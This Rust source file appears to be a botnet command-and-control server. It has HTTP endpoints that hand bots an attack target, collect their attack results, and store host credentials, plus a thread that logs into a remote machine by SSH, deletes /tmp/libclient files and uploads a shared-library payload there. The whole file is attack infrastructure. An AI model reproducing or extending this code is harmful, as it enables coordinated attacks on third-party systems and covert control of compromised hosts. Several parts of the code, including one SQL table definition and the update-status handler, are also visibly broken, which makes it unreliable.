extern crate bodyparser;
extern crate iron;
extern crate postgres;
extern crate router;
extern crate rusqlite;

use iron::prelude::*;
use iron::status;
use router::Router;
use rusqlite::Connection;
use std::{thread, vec};
use serde_json::{from_str, Value};
use std::io::{Read, Write};
use std::str::from_utf8;
use ssh::{Session, Scp, Mode};


fn create_tables(conn: &Connection) {
    conn.execute(
        "CREATE TABLE IF NOT EXISTS request_info (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             status_code TEXT,
             received_data TEXT
         )",
        [],
    )
    .unwrap();
    conn.execute(
        "CREATE TABLE IF NOT EXISTS attack_address (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             address TEXT)",
        [],
    )
    .unwrap();
    conn.execute(
        "CREATE TABLE IF NOT EXISTS update_info (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_username TEXT
             password TEXT)",
        [],
    ).unwrap();
    conn.execute(
        "CREATE TABLE IF NOT EXISTS is_updating(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            is_updating TEXT)",
        []
    ).unwrap();
}
fn main() {
    let mut router = Router::new();
    router.get(
        "/api/attack",
        move |_: &mut Request| {
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            let q = "SELECT * FROM attack_address";
            let mut stmt = conn.prepare(q).unwrap();
            let iter = stmt
                .query_map([], |row| {
                    Ok(serde_json::json!({
                        "id" : row.get::<usize, i64>(0).unwrap().to_string(),
                        "address" : row.get::<usize, String>(1).unwrap().to_string()
                    }))
                })
                .unwrap();
            let mut value = String::new();
            for elem in iter {
                value = elem.unwrap()["address"].to_string();
            }
            Ok(Response::with((status::Ok, value)))
        },
        "attack",
    );

    router.get(
        "/attack_info",
        move |_: &mut Request| {
            let mut vec: Vec<String> = vec![];
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            let q = "SELECT * FROM request_info";
            let mut stmt = conn.prepare(q).unwrap();
            let iter = stmt
                .query_map([], |row| {
                    Ok(serde_json::json!({
                        "id": row.get::<usize, i64>(0).unwrap().to_string(),
                        "status_code": row.get::<usize, String>(1).unwrap().to_string(),
                        "received_data": row.get::<usize, String>(2).unwrap().to_string()
                    }))
                })
                .unwrap();
            for elem in iter {
                vec.push(elem.unwrap().to_string());
            }
            Ok(Response::with((status::Ok, vec.join("\n"))))
        },
        "attack_info",
    );

    router.post(
        "/api/attack",
        move |req: &mut Request| {
            let body = req.get::<bodyparser::Json>().unwrap();
            let _received = match body {
                None => serde_json::json!({"address": ""}),
                Some(body) => serde_json::json!({ "address": body }),
            };
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            conn.execute("DELETE FROM attack_address", []).unwrap();
            conn.execute(
                "INSERT INTO attack_address (address) VALUES (?1)",
                [_received["address"].to_string()],
            )
            .unwrap();
            Ok(Response::with((status::Ok, "ok")))
        },
        "attack_post",
    );

    router.post(
        "/attack_info",
        move |req: &mut Request| {
            let mut response = req.get::<bodyparser::Json>().unwrap().unwrap().to_string();
            response = response
                .strip_prefix("[\"{")
                .unwrap()
                .to_string()
                .strip_suffix("}\"]")
                .unwrap()
                .to_string();
            let resp: Vec<&str> = response.split("}\",\"{").collect();
            let mut jsons: Vec<Value> = vec![];
            for elem in resp {
                let val = elem.to_string();
                let mut splitted = val.split("\",").collect::<Vec<&str>>();
                let code = splitted
                    .pop()
                    .unwrap()
                    .to_string()
                    .split(":")
                    .collect::<Vec<&str>>()[1]
                    .to_string();
                let body_opt = splitted.pop();
                let mut body = String::new();
                match body_opt {
                    None => {
                        continue;
                    }
                    Some(body_opt) => {
                        body =
                            body_opt.to_string().split("\":").collect::<Vec<&str>>()[1].to_string();
                    }
                }
                let status =
                    from_str::<i32>(code.trim_matches(|c| char::is_ascii_punctuation(&c))).unwrap();
                jsons.push(serde_json::json!({"code": status, "body": body}));
            }
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            for res in jsons.iter() {
                conn.execute(
                    "INSERT INTO request_info (status_code, received_data) VALUES (?1, ?2)",
                    [res["code"].to_string(), res["body"].to_string()],
                )
                .unwrap();
            }
            Ok(Response::with((status::Ok, "ok")))
        },
        "set_attack_info",
    );

    router.post(
        "/update_info",
            move|req: &mut Request| {
                let conn = Connection::open("bot_network.db").unwrap();
                let request = req.get::<bodyparser::Json>().unwrap().unwrap().to_string();
                let splitted = request.split("\",").collect::<Vec<&str>>();
                let ip_username = splitted[0].to_string();
                let password = splitted[1].to_string();
                conn.execute(
                    "INSERT INTO update_info (ip_username, password) VALUES (?1, ?2)",
                    [ip_username, password]
                )
                    .unwrap();
                Ok(Response::with((status::Ok, "ok")))
        },
        "post_update_info"
    );
    
    router.get(
        "/currently_updating",
        move |_: &mut Request| {
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            let q = "SELECT * FROM is_updating";
            let mut stmt = conn.prepare(q).unwrap();
            let iter = stmt
                .query_map([], |row| {
                    Ok(serde_json::json!({
                        "id" : row.get::<usize, i64>(0).unwrap().to_string(),
                        "is_updating" : row.get::<usize, String>(1).unwrap().to_string()
                    }))
                })
                .unwrap();
            let mut value = String::new();
            for elem in iter {
                value = elem.unwrap()["address"].to_string();

            }
            Ok(Response::with((status::Ok, value)))
        },
        "currently_updating",
    );
    router.post(
        "/currently_updating",
        move |req: &mut Request| {
            let body = req.get::<bodyparser::Json>().unwrap();
            let _received = match body {
                None => serde_json::json!({"address": ""}),
                Some(body) => serde_json::json!({ "updating": body }),
            };
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            conn.execute("DELETE FROM is_updating", []).unwrap();
            conn.execute(
                "INSERT INTO is_updating (is_updating) VALUES (?1)",
                [_received["updating"].to_string()],
            )
                .unwrap();
            Ok(Response::with((status::Ok, "ok")))
        },
        "change_updating",
    );

    router.get(
        "/update_info",
        move |_: &mut Request| {
            let mut vec: Vec<String> = vec![];
            let conn = Connection::open("bot_network.db").unwrap();
            create_tables(&conn);
            let q = "SELECT * FROM update_info";
            let mut stmt = conn.prepare(q).unwrap();
            let iter = stmt
                .query_map([], |row| {
                    Ok(serde_json::json!({
                        "id": row.get::<usize, i64>(0).unwrap().to_string(),
                        "ip_username": row.get::<usize, String>(1).unwrap().to_string(),
                        "password": row.get::<usize, String>(2).unwrap().to_string()
                    }))
                })
                .unwrap();
            for elem in iter {
                vec.push(elem.unwrap().to_string());
            }

            Ok(Response::with((status::Ok, vec.join("\n"))))
        },
        "get_update_info",
    );
    let server = thread::spawn(|| Iron::new(router).http("localhost:8080").unwrap());
    thread::spawn(||{
        let mut session= Session::new().unwrap();
        session.set_host("username here").unwrap();
        session.parse_config(Option::from(std::path::Path::new("/etc/ssh/ssh_config"))).unwrap();
        session.connect().unwrap();
        session.userauth_password("password here").unwrap();
        loop
        {
            thread::sleep(std::time::Duration::from_secs(1));
            let client = reqwest::blocking::Client::new();
            let is_updating_response = client.get("http://localhost:8080/currently_updating").send();

            if let Ok(mut response) = is_updating_response {
                if response.status().is_success() {
                    let body = response.text().unwrap();
                    if let Ok(json) = serde_json::from_str::<Value>(&body) {
                        if let Some(updating) = json.get("is_updating").and_then(Value::as_bool) {
                            if updating {
                                let mut s = session.channel_new().unwrap();
                                s.open_session().unwrap();
                                s.request_exec(b"rm /tmp/libclient*").unwrap();
                                s.send_eof().unwrap();
                                let mut path = std::path::Path::new("path_to_so");
                                let mut text = std::fs::read_to_string(path).unwrap();
                                let length = text.len();
                                let mut scp = session.scp_new(Mode::WRITE, "/tmp").unwrap();
                                let _ = scp.init().unwrap();
                                let _ = scp.push_file("dylib.so", length, 0o644).unwrap();
                                let x = scp.write(text.as_bytes()).unwrap();

                                let _ = client
                                    .post("http://localhost:8080/currently_updating")
                                    .header(reqwest::header::CONTENT_TYPE, "application/json")
                                    .body(serde_json::to_string(&serde_json::json!({"updating": false})).unwrap())
                                    .send();
                            }
                        }
                    }
        }}}
    }
    );
    server.join();
}
